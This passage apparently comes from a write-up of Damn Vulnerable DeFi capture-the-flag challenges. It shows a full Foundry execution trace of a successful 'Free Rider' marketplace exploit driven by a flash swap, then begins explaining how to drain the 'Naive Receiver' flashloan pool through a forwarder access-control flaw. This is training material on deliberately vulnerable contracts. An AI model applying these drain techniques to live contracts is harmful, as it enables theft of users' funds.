    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">5)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [62760] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   ├─ [31045] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [21967] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   │   │   │   ├─ [14652] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   ├─ [0] player::fallback{value: 45000000000000000000}()</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [24345] WETH::deposit{value: 15045135406218655968}()</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="na">│   │   │   │   ├─ emit Deposit(who: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15045135406218655968 [1.504e19])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount</span><span class="err">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [825] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 9000045135406218655968 [9e21]</span>
    <span class="s">│   │   ├─ [2802] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]</span>
    <span class="na">│   │   ├─ emit Sync(reserve0</span><span class="pi">:</span> <span class="s">9000045135406218655968 [9e21], reserve1</span><span class="err">:</span> <span class="s">15000000000000000000000 [1.5e22])</span>
    <span class="na">│   │   ├─ emit Swap(sender: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount0In</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19], amount1In</span><span class="err">:</span> <span class="s">0, amount0Out</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19], amount1Out</span><span class="err">:</span> <span class="s">0, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [29235] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">1)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">2)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">3)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">4)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">5)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [425] FreeRiderNFTMarketplace::offersCount() [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertGt(45060000000000000000 [4.506e19], 45000000000000000000 [4.5e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 12.62ms (4.17ms CPU time)</span>

</code></pre></div></div>

<hr />

<h2 id="naive-receiver-challenge">Naive Receiver Challenge</h2>

<hr />

<h3 id="challenge-overview-3">Challenge Overview</h3>

<p>This challenge exploits an <strong>access control flaw</strong> in a meta-transaction system combined with a flashloan fee mechanism. A vulnerable pool offers flashloans with a fixed 1 WETH fee. The victim (user) has a receiver contract with 10 WETH balance and unknowingly becomes the target of draining attacks via flashloans.</p>

<p>The objective is to <strong>drain all WETH</strong> from both the pool and the user’s receiver contract, and deposit the funds into a designated recovery address.</p>

<hr />

<h3 id="smart-contract-breakdown">Smart Contract Breakdown</h3>

<h4 id="key-contracts">Key Contracts</h4>
<ul>
  <li><strong>NaiveReceiverPool</strong>: Offers flashloans of WETH with a fixed fee of 1 WETH per call.</li>
  <li><strong>FlashLoanReceiver</strong>: A sample user-deployed contract able to receive flashloans.</li>
  <li><strong>BasicForwarder</strong>: A meta-transaction forwarder that allows execution of calls on behalf of users via valid signatures.</li>
</ul>

<h4 id="important-mechanisms">Important Mechanisms</h4>
<ul>
  <li><strong>flashLoan(address receiver, address token, uint256 amount, bytes calldata data)</strong><br />
Executes a flashloan and charges a 1 WETH fee, regardless of loan amount.</li>
  <li><strong>multicall(bytes[] calldata data)</strong><br />
Allows batching of multiple calls in a single transaction.</li>
  <li><strong>forwarder.execute(request, signature)</strong><br />
Permits off-chain signed execution of calls via the meta-transaction forwarder.</li>
</ul>

<hr />

